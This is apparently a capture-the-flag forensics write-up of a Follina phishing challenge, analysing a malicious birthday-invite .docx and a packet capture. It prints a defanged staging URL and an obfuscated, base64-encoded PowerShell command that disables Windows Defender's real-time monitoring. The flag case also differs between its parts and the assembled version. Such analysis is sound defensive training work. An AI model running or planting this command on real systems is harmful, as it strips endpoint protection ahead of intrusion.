# Lina's Invitation

## Prompt
A CEO of a startup company reported that he could no longer access his Password Vault. It seems the password has been changed, but he states not to have done so. He reports receiving a birthday invitation to a Paintball party the last week. A few days later, his Italian friend told him that her email had been hacked and never sent out those birthday invites. He fears his lost password might have something to do with that birthday invite. Their SOC team confirmed their assumptions by admitting that this document escaped their attention and did not trigger any alert. Now they want us, ENIGMA, to analyze the provided network capture they took on the day and the document sent via his friends' email.

## Files
- birthday_invite.docx
- capture.pcapng

## Tools Used
- https://github.com/decalage2/oletools

## birthday_invite.docx

![Birthday Invite](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_birthday_invite.png)

### Using olevba on birthday_invite.docx

![olevba on Birthday Invite](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_olevba_on_doc.png)

### Unzipping the Docx 

![Unzipping the Doc](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_unzip_doc.png)

### Using oletools on Contents

![Using oletools on Contents](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_using_oletools_on_contents.png)

`hxxp://windowsliveupdater.com?Pt2=RjBsbGluYV9oNHNf-->`

## PCAP Analysis

### Phishing site

![Phishing Site](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_phishing_site.png)

### Possible Initial Payload

![Possible Initial Payload](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc_1.png)

### Alex Has Been Pwnd

![Alex Has Been Pwnd](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc_2.png)

```powershell
powershell.exe -enc LgAgACgAIAAkAGUAbgBWADoAYwBvAG0AUwBwAGUAYwBbADQALAAyADQALAAyADUAXQAtAEoATwBpAG4AJwAnACkAIAAoACAAKAAoACgAIgB7ADIAfQB7ADAAfQB7ADcAfQB7ADEAfQB7ADEAMQB9AHsANQB9AHsANgB9AHsAOQB9AHsAMQAwAH0AewA0AH0AewA4AH0AewAzAH0AIgAtAGYAIAAnAGUAZgAnACwAJwAgACcALAAnAFMAZQB0AC0ATQBwAFAAcgAnACwAJwB1AGUAJwAsACcAdAAnACwAJwBhAGwAdABpAG0AZQAnACwAJwBNAG8AbgBpACcALAAnAGUAcgBlAG4AYwBlACcALAAnAHIAJwAsACcAdABvAHIAJwAsACcAaQBuAGcAIABLADMANQAnACwAJwAtAEQAaQBzAGEAYgBsAGUAUgBlACcAKQApACAALQByAGUAcABMAGEAYwBFACAAIAAnAEsAMwA1ACcALABbAEMAaABBAFIAXQAzADYAKQApAA==
```

## Actual Forensics

### IOC 1

![Forensics - IOC 1-1](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_forensics_ioc_1_1.png)
![Forensics - IOC 1-2](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc_1_2.png)

- flag pt 1 = `HTB{Zer0_DayZ_4Re_C0Ol_BuT_`

### IOC 2

![Forensics - IOC 3](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc3.png)
- flag pt 2 = `F0llina_h4s_`

### IOC 3

![Forensics - IOC 2-1](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc2_1.png)
![Forensics - IOC 2-2](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc2_2.png)

- flag pt 3 = `b33n_pAtch3d!}`

## Assembled flag
- `HTB{Zer0_DayZ_4Re_C0Ol_BuT_F0llina_h4s_B33N_PaTCH3D!}`
